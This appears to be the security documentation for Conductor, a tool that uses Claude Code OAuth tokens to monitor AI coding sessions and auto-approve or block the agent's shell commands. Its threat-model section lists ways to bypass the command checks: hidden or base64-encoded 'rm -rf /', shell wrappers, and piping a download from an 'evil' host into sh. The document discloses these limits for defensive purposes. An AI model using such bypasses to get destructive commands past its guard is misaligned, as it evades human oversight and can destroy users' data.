# Security

Conductor interacts with Claude Code's OAuth credentials to connect to the Remote Control API. This document explains exactly how tokens are handled and what guarantees you can and cannot expect.

---

## What Conductor Reads

Conductor reads OAuth credentials from **one location only**:

- `~/.claude/.credentials.json` → `claudeAiOauth.accessToken` + `claudeAiOauth.refreshToken`

And organization metadata from:

- `~/.claude.json` → `oauthAccount.organizationUuid`

These files are created and maintained by Claude Code itself. Conductor never writes to them.

### Read locations in code

| File | Line | Function |
|---|---|---|
| `remote-control.py` | 87–105 | `get_oauth_token()` — called at startup and on each scan loop iteration |
| `remote-control.py` | 109–118 | `get_org_uuid()` — reads `organizationUuid` from `.claude.json` |
| `bridge-server.py` | 936–944 | `tool_discover_rc_sessions()` — reads token for API discovery |
| `bridge-server.py` | 1060–1068 | `tool_send_task()` — reads token for HTTP POST |

Grep to verify after cloning the repo:
```bash
grep -n "accessToken\|refreshToken" bridge-server.py remote-control.py
```

---

## What Conductor Does With Tokens

Tokens are used **exclusively** in HTTP `Authorization: Bearer {token}` headers for two destinations:

- `https://api.anthropic.com/v1/*` (session discovery, event POST)
- `wss://api.anthropic.com/v1/sessions/ws/*` (WebSocket subscription)

**No other destinations.** No telemetry. No analytics. No third-party endpoints. No log aggregators. No crash reporters.

---

## What Conductor Writes to Disk

All Conductor-written files live under `~/.claude/conductor/`:

| File | Contents | Contains tokens? |
|---|---|---|
| `goals.json` | `{sessionId: {goal, riskLevel, registeredAt}}` | **No** |
| `decisions.json` | `[{sessionId, project, recommendation, reason, tool, timestamp}]` | **No** |
| `log.md` | Event strings like `"RC APPROVED {project}: {tool} — {reason}"` | **No** |
| `flags/{sessionId}.json` | Hook control flags: `{action, reason, tool}` | **No** |

### Verification

Every file write in the codebase:

```bash
grep -n "json\.dump\|\.write(" bridge-server.py remote-control.py
```

None of these write operations receive token data. The token variable is passed as a function parameter in-memory only and is used exclusively inside HTTP `Authorization` headers before being garbage collected.

The only log line that mentions tokens at all is:

```python
log.info(f"Token loaded (expires: {datetime.fromtimestamp(oauth['expiresAt']/1000).isoformat()})")
```

This logs the **expiry timestamp**, not the token value.

---

## Network Traffic

Conductor only talks to Anthropic's API:

| Endpoint | Purpose | Auth |
|---|---|---|
| `GET https://api.anthropic.com/v1/code/sessions` | List active RC sessions | Bearer token |
| `POST https://api.anthropic.com/v1/sessions/{id}/events` | Send user message to session | Bearer token |
| `wss://api.anthropic.com/v1/sessions/ws/{id}/subscribe` | Permission request WebSocket | Bearer token |

You can verify by searching for URLs:

```bash
grep -rn "http\|wss" bridge-server.py remote-control.py
```

---

## What Conductor Cannot Guarantee

Being explicit about the limits of these guarantees:

### In-memory exposure
Tokens exist in process memory (RAM) during runtime. This is unavoidable for any HTTP client that sends authenticated requests. Python's garbage collector will eventually reclaim the string, but the exact timing is not deterministic.

### Debugger / memory dumps
If Conductor runs under a debugger, profiler, or any tool that can inspect process memory, tokens will be visible — like any credential in any Python process. Don't run Conductor under untrusted debugging tools.

### Operating system behavior
On Windows/Linux, `~/.claude/.credentials.json` is stored as plaintext (this is Claude Code's behavior, not Conductor's). On macOS, Claude Code uses the system Keychain. Conductor does not change this.

### Downstream reads
Any code that imports `bridge-server.py` or `remote-control.py` can call `get_oauth_token()` if given filesystem access to `~/.claude/.credentials.json`. The security boundary is the credentials file itself — protect it like you would `~/.ssh/id_rsa`.

### Formal verification
This document is based on code review, not formal verification. If you find a path where a token could be written to disk, logged, or transmitted outside Anthropic's API, please open an issue immediately.

---

## Hardening Recommendations

If you want additional safety:

1. **Run Conductor in a sandboxed user account** with no network access to third parties (firewall rules allowing only `api.anthropic.com`)
2. **Review every PR** to `bridge-server.py` and `remote-control.py` for new write operations that could touch token data
3. **Use filesystem ACLs** to restrict `~/.claude/.credentials.json` to `0600` permissions
4. **Rotate tokens** periodically by signing out and back into Claude Code
5. **Monitor outbound traffic** with a tool like `tcpdump` or `Wireshark` to confirm Conductor only talks to `api.anthropic.com`

---

## Threat Model for Command Analysis

Conductor includes two command safety layers:

1. **`remote-control.py` `_analyze_bash_command()`** — decides whether to auto-approve Bash commands via the RC WebSocket
2. **`hooks/conductor-guard.js` `analyzeBashCommand()`** — blocks dangerous commands at the PreToolUse hook level

**Both layers use tokenized command analysis (via `shlex.split` in Python and a naive tokenizer in Node), not substring/regex matching.**

### What These Layers ARE

- **Defense in depth against honest mistakes** — you asked Claude to push a branch, it tries `git push --force` by accident, the layer catches it
- **A safety net, not a sandbox** — Tokenization catches common flag cluster bypasses like `git push -fu` that substring checks miss
- **A speed bump between Claude and your filesystem** — gives you time to review escalations via Telegram or human approval

### What These Layers ARE NOT

These checks are **not a security boundary against adversarial input**. They can be bypassed by:

- **Variable expansion**: `CMD="rm -rf /"; $CMD`
- **Command substitution**: `$(echo "rm -rf /")` or backticks
- **Encoded payloads**: `echo cm0gLXJmIC8= | base64 -d | sh`
- **Shell wrappers**: `bash -c "..."`, `python -c "..."`, `node -e "..."`, `eval "..."`
- **Indirect execution**: writing a script with `Write` tool, then executing it
- **Network downloads**: `curl https://evil/script | sh`
- **Alternative interpreters**: `perl -e`, `ruby -e`, `awk 'BEGIN{system("...")}'`

The analyzer **does** flag `sh -c`, `bash -c`, `python -c`, and pipe-to-shell patterns as dangerous (escalate), because it can't see inside them.

### The Real Security Boundaries

In order of importance:

1. **The OAuth token itself** — protects the API from unauthorized access
2. **Human-in-the-loop approval** — the user hits Y to approve each tool by default
3. **Conductor flags** — `set_flag(session_id, "block")` pauses a session completely via the hook
4. **Pattern analysis** (this layer) — last-resort speed bump against obvious footguns

Do not disable human approval in a session and rely only on the pattern analyzer. It will catch `git push -fu` but not `bash -c "git push --force"`.

### Reporting Bypasses

If you find a command that the analyzer auto-approves but should have been escalated, please open an issue with the exact command string. We can add it to the test suite and strengthen the analyzer. Thanks to @consigcody94 for the first bypass report (#2) that prompted this rewrite.

---

## Reporting Vulnerabilities

If you discover a security issue, please open a private security advisory on GitHub or email the maintainer directly rather than opening a public issue. Token handling is the single most sensitive area of this project — responsible disclosure is appreciated.

---

*This document was written in response to a security audit question from @tuxerrante. Thank you to everyone who takes the time to review credential handling in open source projects.*
